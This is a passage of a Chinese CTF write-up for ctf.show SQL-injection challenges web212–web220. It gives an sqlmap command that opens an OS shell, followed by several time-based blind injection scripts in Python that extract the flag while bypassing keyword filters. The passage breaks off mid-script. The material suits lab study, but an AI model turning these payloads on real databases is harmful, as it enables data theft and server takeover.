<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1  --tamper=web212 --os-shell<br></code></pre></td></tr></table></figure>

<p>按4，1然后上传文件，然后执行命令</p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>这题开始是时间盲注，配合bp食用更佳</p>
<p>找不到注入点，orz,看了一下wp需要抓包，在api里面找到，直接上吧，设置debug&#x3D;1,注入点是ip，</p>
<p>这里根据web175的进行微调一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://9a47d60c-a58c-473d-8fda-bcd4534a6d2a.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&quot;ip&quot;:f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.5),0)&quot;,&#x27;debug&#x27;:1&#125;</span><br>        payload = &#123;<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;if(substr((select flaga from ctfshow_flagx),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.5),0)&quot;</span>,<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-number">1</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>写代码中dict的逗号不能少，是我在改代码中遇到的一个小问题</p>
<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>用了单引号</p>
<p>和上题基本一致，用了引号就需要记得闭合，%23过滤掉后面的即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://fcff0b3a-2480-4088-88e3-4a8554259ae8.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0&#x27; or if(substr((select flagaa from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>需要闭合，所以调整了一下payload的顺序，在爆表的时候出现了数字异常，手动调一下就行，最后可以得到flag</p>
<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>where id &#x3D; from_base64($id);</p>
<p>一开始以为是需要对payload进行base64的转化，其实就是)的提前闭合就可以了，可以沿用上一题的脚本，微调一下就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://8184624f-3ac4-4ac2-b195-865a82d8cb94.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxcc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>本题过滤了sleep,网上可以简答的搜索一下内容</p>
<p>使用 <code>BENCHMARK</code> 函数，结合一个较大的数值来引入延迟。这是MySQL中的内置函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://078b3b8c-d67e-4948-b1f2-239e5176f712.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxccb),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>这题benchmark也被禁用了，尝试一些其他方法</p>
<p>我使用的是笛卡尔积造成的短暂延迟，结合两个表的计数可以引入一定的延迟。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://380bc0f7-937d-4516-a20e-aaa284e086a2.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>禁用了rlike，我没使用到，继续用上题的脚本,需要微调一下时间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://eca68551-e138-419b-a9f7-8bff2348458d.challenge.ctf.show//api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxca),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure>

<p>禁用的东西挺多的</p>
<p>concat既然禁用了可以使用limit进行绕过，微调一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://581c4aa9-8e30-4f3e-9253-216e7c43703a.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(left((select flagaabcc from ctfshow_flagxcac),<span class="hljs-subst">&#123;index&#125;</span>)regexp(&#x27;<span class="hljs-subst">&#123;flag+char&#125;</span>&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 